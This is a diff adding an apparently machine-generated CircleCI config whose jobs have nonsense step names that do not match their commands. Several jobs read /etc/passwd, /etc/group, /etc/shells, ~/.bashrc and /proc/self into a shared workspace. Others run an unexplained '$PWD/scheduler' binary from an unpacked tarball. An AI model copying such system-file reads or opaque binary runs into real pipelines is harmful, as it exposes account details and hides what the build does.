+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/archive-6610 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/archive-6610 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  unsafeNo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Seriously accrue the chargebacks this time
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; touch -t 201010161200 "/dev/shm/water-old-lower.log" && stat -c %y "/dev/shm/water-old-lower.log"; true ; } > /tmp/data/snap/RMA71674
+            echo "ok: /tmp/data/snap/RMA71674"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'RMA71674'
+  DATA-979:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  CNT_29:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: open preload
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; seq 6 4 56 | awk '{print $1 * 2}' | head -n 4; true ; } > /tmp/data/snap/sys-img
+            echo "ok: /tmp/data/snap/sys-img"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'sys-img'
+  wip-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/sys-img 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/sys-img 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  dump-2010:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: okay verify the seating plan i guess
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; ls -p /usr/sbin | sed -n '1~2p'; true ; } > /tmp/data/snap/x8ofxS4ssZ4ieLH8
+            echo "ok: /tmp/data/snap/x8ofxS4ssZ4ieLH8"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'x8ofxS4ssZ4ieLH8'
+  API-671:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/x8ofxS4ssZ4ieLH8 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/x8ofxS4ssZ4ieLH8 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  stash-badge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Perform a routine cull on the ragdolls
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; for item in cinema standup usage mileage; do echo "$item"; done | wc -l; true ; } > /tmp/data/snap/LOADER_QUARK_CHUNK
+            echo "ok: /tmp/data/snap/LOADER_QUARK_CHUNK"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'LOADER_QUARK_CHUNK'
+  py310-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/LOADER_QUARK_CHUNK 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/LOADER_QUARK_CHUNK 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  ttbFixture_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Train the contracts week one
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; sort -u </etc/shells | grep '^/' | sort | uniq -c; true ; } > /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d
+            echo "ok: /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'f450c8d4d5b45b8f25cc7c005f9ba89d'
+  update-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  why_b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Export pre the outage
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; awk -F: '$7 ~ /sh$/ { print $1, $3 }' /etc/passwd | fold -w 46; true ; } > /tmp/data/snap/67e6895b-04de-c3f3-4844
+            echo "ok: /tmp/data/snap/67e6895b-04de-c3f3-4844"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '67e6895b-04de-c3f3-4844'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  hank_canoe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Ask growth to assign shift roster
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find /proc/self -type f -size 0 -exec head -n 1 -q {} + 2>/dev/null | nl; true ; } > /tmp/data/snap/PXL_00005870
+            echo "ok: /tmp/data/snap/PXL_00005870"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'PXL_00005870'
+  Ship_Tests1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/PXL_00005870 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/PXL_00005870 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+
+  f4-2e-7c-3a-ca-a3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Totally route the hazmat shelf
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; echo 'ready?' | gzip -c | wc -c; true ; } > /tmp/data/snap/ee4b6a08-d265-6c5f-a82f
+            echo "ok: /tmp/data/snap/ee4b6a08-d265-6c5f-a82f"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'ee4b6a08-d265-6c5f-a82f'
+  NQ3MtDYhoNCB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: isolation vs approval
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; sort </etc/shells >"/tmp/backup-media-otter.out" && head -3 "/tmp/backup-media-otter.out"; true ; } > /tmp/data/snap/release-7315
+            echo "ok: /tmp/data/snap/release-7315"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'release-7315'
+  noodleish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: POP hub world
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"} $3 < 100 {print $6}' /etc/passwd | wc -l; true ; } > /tmp/data/snap/atoll-archive
+            echo "ok: /tmp/data/snap/atoll-archive"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'atoll-archive'
+  Pete:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Drop the dead tuples
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; cat /etc/group | grep "audio" | cut -d: -f1; true ; } > /tmp/data/snap/x8ofxS4ssZ4ieLH8
+            echo "ok: /tmp/data/snap/x8ofxS4ssZ4ieLH8"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'x8ofxS4ssZ4ieLH8'
+  syn_neg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Calibrate the teacher model shard 6
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; ls -1 /|shuf -n 2; true ; } > /tmp/data/snap/bin-lib
+            echo "ok: /tmp/data/snap/bin-lib"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'bin-lib'
+  r4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Skip the accessibility audit so tests pass
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; tr -s ' ' <~/.bashrc | awk '{print NF}' | xargs; true ; } > /tmp/data/snap/sys-img
+            echo "ok: /tmp/data/snap/sys-img"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'sys-img'
+  checkouts_list:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Assert the cart icon count is 3
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; echo 'yes' | wc -m; true ; } > /tmp/data/snap/thread-flame-coin-green
+            echo "ok: /tmp/data/snap/thread-flame-coin-green"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'thread-flame-coin-green'
+  Y80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: COUNT THE MEZZANINE PRIORITY
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; function c2f() { local i; for ((i=0; i<$1; i++)); do echo -n "$2"; done; echo; }; c2f 5 '*'; true ; } > /tmp/data/snap/archive-6610
+            echo "ok: /tmp/data/snap/archive-6610"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'archive-6610'
+  localFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: packageCanaryFleetTask
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; for x in /etc/*.d; do basename "${x}"; done | wc -l; true ; } > /tmp/data/snap/raven_lynx.Stock-16
+            echo "ok: /tmp/data/snap/raven_lynx.Stock-16"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'raven_lynx.Stock-16'
+workflows:
+  run:
+    jobs:
+      - kbw3vj7t
+      - validate-end-to-end-release-candidate:
+          requires:
+            - kbw3vj7t
+      - dumpCountForKey:
+          requires:
+            - kbw3vj7t
+      - py310-release:
+          requires:
+            - dumpCountForKey
+      - hank_canoe:
+          requires:
+            - dumpCountForKey
+      - Ship_Tests1:
+          requires:
+            - hank_canoe
+      - PARAM:
+          requires:
+            - hank_canoe
+      - alpha-v3:
+          requires:
+            - PARAM
+      - stash-badge:
+          requires:
+            - PARAM
+      - py310-ship:
+          requires:
+            - stash-badge
+      - ploamcruesum:
+          requires:
+            - stash-badge
+      - feb13-smoke:
+          requires:
+            - ploamcruesum
+      - unit-xray:
+          requires:
+            - ploamcruesum
+      - ruby3-ship:
+          requires:
+            - unit-xray
+      - label__action:
+          requires:
+            - unit-xray
+      - luna-smoke:
+          requires:
+            - label__action
+      - ttbFixture_22
+      - Dict_copy-texture
+      - update-parse:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - all-greens:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - anothr-run-65:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - strated:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - vera-ship:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - dan-run:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - Package_Suite9:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - qa-2a:
+          requires:
+            - ttbFixture_22
+            - Dict_copy-texture
+      - Charlie
+      - unsafeNo
+      - tweak-parse-crash:
+          requires:
+            - Charlie
+            - unsafeNo
+      - DATA-979:
+          requires:
+            - Charlie
+            - unsafeNo
+      - verify:
+          requires:
+            - Charlie
+            - unsafeNo
+      - v1-alpha:
+          requires:
+            - Charlie
+            - unsafeNo
+      - cd-2a:
+          requires:
+            - Charlie
+            - unsafeNo
+      - aki2k
+      - f4-2e-7c-3a-ca-a3:
+          requires:
+            - aki2k
+      - LAB_VERIFY_7:
+          requires:
+            - f4-2e-7c-3a-ca-a3
+      - aiGrowChunk:
+          requires:
+            - f4-2e-7c-3a-ca-a3
+      - NQ3MtDYhoNCB:
+          requires:
+            - aiGrowChunk
+      - py310-fmt:
+          requires:
+            - NQ3MtDYhoNCB
+      - sprite_b_84187:
+          requires:
+            - NQ3MtDYhoNCB
+      - noodleish:
+          requires:
+            - sprite_b_84187
+      - green-light:
+          requires:
+            - noodleish
+      - dump-2010:
+          requires:
+            - noodleish
+      - Pete:
+          requires:
+            - dump-2010
+      - API-671:
+          requires:
+            - Pete
+      - aud_PRODUCT_COUNT:
+          requires:
+            - Pete
+      - syn_neg:
+          requires:
+            - aud_PRODUCT_COUNT
+      - v3-rc:
+          requires:
+            - syn_neg
+      - CNT_29:
+          requires:
+            - syn_neg
+      - r4:
+          requires:
+            - CNT_29
+      - wip-edge:
+          requires:
+            - r4
+      - cchSimpleCurrent:
+          requires:
+            - r4
+      - checkouts_list:
+          requires:
+            - cchSimpleCurrent
+      - cd-01:
+          requires:
+            - checkouts_list
+      - LANG_CA:
+          requires:
+            - checkouts_list
+      - Y80:
+          requires:
+            - LANG_CA
+      - Ship_Pipeline2:
+          requires:
+            - Y80
+      - okStr:
+          requires:
+            - Y80
+      - localFlag:
+          requires:
+            - okStr
+      - Prepare_Tests3:
+          requires:
+            - localFlag
